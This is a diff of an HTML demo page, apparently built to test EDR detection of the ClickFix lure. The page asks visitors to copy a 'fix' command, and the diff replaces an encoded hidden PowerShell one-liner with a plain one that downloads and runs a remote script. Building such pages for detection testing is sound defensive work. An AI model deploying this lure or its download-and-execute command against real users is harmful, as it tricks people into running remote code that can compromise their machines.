@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ClickFixデモ用のサイトです</title>
+    <title>ClickFixデモサイト</title>
     <style>
         body { font-family: Arial, sans-serif; padding: 50px; background: #f0f0f0; }
         .header { text-align: center; margin-bottom: 30px; }
@@ -20,7 +20,7 @@
 </head>
 <body>
     <div class="header">
-        <h1>ClickFixデモ</h1>
+        <h1>ClickFixデモサイト</h1>
         <p>EDR検知テスト用デモサイト</p>
     </div>
     
@@ -31,7 +31,7 @@
         <p>以下のボタンをクリックして修正コマンドをコピーしてください：</p>
         
         <div class="command-box" id="command">
-powershell -w hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAG8AcgBvADUAMQAxAC8AZABlAHQAZQBjAHQAaQBvAG4ALQB0AGUAcwB0AGkAbgBnAC8AbQBhAGkAbgAvAHQAZQBzAHQAMQBfAGIAYQBzAGkAYwBfAGkAbgBmAG8ALgBwAHMAMQAnACkA
+powershell -w hidden -c "iex(iwr 'https://raw.githubusercontent.com/choro511/detection-testing/refs/heads/main/test1_basic_info.ps1' -UseBasicParsing)"
         </div>
         
         <button class="fix-button" onclick="copyCommand()">修正コマンドをコピー</button>
